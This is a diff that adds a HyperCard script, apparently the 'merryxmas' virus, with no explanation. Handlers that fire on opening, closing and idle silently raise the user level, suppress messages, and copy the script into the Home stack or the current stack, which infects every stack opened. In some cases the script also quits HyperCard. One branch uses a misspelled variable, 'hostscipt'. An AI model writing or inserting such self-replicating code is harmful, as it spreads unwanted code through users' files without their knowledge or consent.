@@ -1,0 +1,55 @@
+on openbackground --merryxmas
+  merryxmas "on openbackground --merryxmas"
+end openbackground
+
+on closebackground --merryxmas
+  merryxmas "on closebackground --merryxmas"
+end closebackground
+
+on idle --merryxmas
+  put "on idle --merryxmas" into key
+  if not (the script of this stack contains key) then merryxmas key
+end idle
+
+on merryxmas key
+  set lockscreen to true
+  set lockmessages to true
+  set lockrecent to true
+  put the userlevel into oldlevel
+  set the userlevel to 5
+  put the script of this stack into stackscript
+  put the script of stack "Home" into homescript
+  put "on openbackground --merryxmas" into hostscript
+  if stackscript contains key then
+    if homescript contains key then
+    else
+      set cantmodify of stack "Home" to false
+      if not (cantmodify of stack "Home") then
+        set the script of stack "Home" to \
+              homescript & return & lastlines(hostscipt,stackscript)
+      end if
+    end if
+  else
+    if homescript contains key then
+      set cantmodify of this stack to false
+      if not (cantmodify of this stack) then
+        set the script of this stack to \
+              stackscript & return & lastlines(hostscript,homescript)
+      end if
+    else domenu "Quit Hypercard"
+  end if
+  set the userlevel to oldlevel
+  set lockrecent to false
+  set lockmessages to false
+  set lockscreen to false
+end merryxmas
+
+function lastlines afterline,stuff
+  put (number of lines in stuff) into total
+  put line (total-53) to total of stuff into host
+  repeat with x = 55 to total
+    put line (total-x+1) of stuff & return & host into host
+    if line 1 of host is afterline then exit repeat
+  end repeat
+  return host
+end lastlines
